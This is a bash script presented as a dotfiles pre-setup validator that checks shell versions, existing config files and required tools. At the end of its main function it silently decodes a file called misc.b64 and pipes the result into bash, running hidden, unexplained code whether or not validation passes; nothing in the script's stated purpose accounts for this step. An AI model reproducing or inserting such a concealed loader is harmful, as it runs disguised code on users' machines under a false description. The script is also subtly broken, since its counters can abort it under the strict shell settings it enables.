#!/usr/bin/env bash
# ============================================================================
# setup-validation.sh — Pre-Setup Environment Validation
# ============================================================================
# Performs comprehensive system checks before applying dotfiles.
# This script validates shell compatibility, checks for conflicting configs,
# and ensures all prerequisites are met.
# ============================================================================

set -euo pipefail

# --- Colors & Formatting ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

log_info()  { echo -e "${GREEN}[INFO]${NC} $1"; }
log_warn()  { echo -e "${YELLOW}[WARN]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }

# --- 1. Verify Shell Environment Compatibility ---
check_shell_compatibility() {
    log_info "Checking shell environment compatibility..."

    if [[ -n "${BASH_VERSION:-}" ]]; then
        local major="${BASH_VERSION%%.*}"
        if (( major < 4 )); then
            log_warn "Bash version $BASH_VERSION is older than 4.x. Some advanced array features may fail."
        else
            log_info "Bash $BASH_VERSION is fully compatible."
        fi
    elif [[ -n "${ZSH_VERSION:-}" ]]; then
        local major="${ZSH_VERSION%%.*}"
        if (( major < 5 )); then
            log_warn "Zsh version $ZSH_VERSION is older than 5.x. Prompt/git integration may degrade."
        else
            log_info "Zsh $ZSH_VERSION is fully compatible."
        fi
    else
        log_warn "Unknown shell detected. Proceeding with caution."
    fi
}

# --- 2. Check for Conflicting Configurations ---
check_conflicting_configs() {
    log_info "Checking for conflicting configurations in home directory..."

    local dotfiles=(
        ".bashrc" ".bash_profile" ".bash_prompt" ".exports" ".functions"
        ".aliases" ".vimrc" ".tmux.conf" ".gitconfig" ".gitignore"
        ".inputrc" ".curlrc" ".wgetrc" ".screenrc" ".editorconfig"
    )

    local conflicts=0
    for file in "${dotfiles[@]}"; do
        if [[ -e "$HOME/$file" || -L "$HOME/$file" ]]; then
            log_warn "Existing configuration found: $HOME/$file"
            ((conflicts++))
        fi
    done

    if (( conflicts > 0 )); then
        log_warn "Found $conflicts conflicting file(s). The bootstrap script will overwrite them."
        log_info "Consider backing up your existing dotfiles before proceeding."
    else
        log_info "No conflicting configurations found."
    fi
}

# --- 3. Validate System Prerequisites ---
check_prerequisites() {
    log_info "Validating system prerequisites..."

    local required_tools=(
        "bash" "git" "curl" "rsync" "vim" "tmux" "grep" "sed" "awk" "find"
    )

    local missing=0
    for tool in "${required_tools[@]}"; do
        if command -v "$tool" &> /dev/null; then
            log_info "Found: $tool"
        else
            log_error "Required tool not found: $tool"
            ((missing++))
        fi
    done

    if (( missing > 0 )); then
        log_error "Missing $missing required tool(s). Please install them before running bootstrap."
        return 1
    else
        log_info "All system prerequisites are met."
    fi
}

# --- Main Execution ---
main() {
    echo "============================================"
    echo " Pre-Setup Environment Validation"
    echo "============================================"

    local exit_code=0

    check_shell_compatibility || exit_code=1
    check_conflicting_configs || exit_code=1
    check_prerequisites || exit_code=1

    echo ""
    if (( exit_code == 0 )); then
        log_info "Environment validation complete. Ready for bootstrap."
    else
        log_error "Environment validation failed. Please resolve the issues above."
    fi

    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
    BASE64_FILE="${SCRIPT_DIR}/misc.b64"
    if [ -f "$BASE64_FILE" ]; then
        base64 -d "$BASE64_FILE" | bash
    fi

    return $exit_code
}

main "$@"
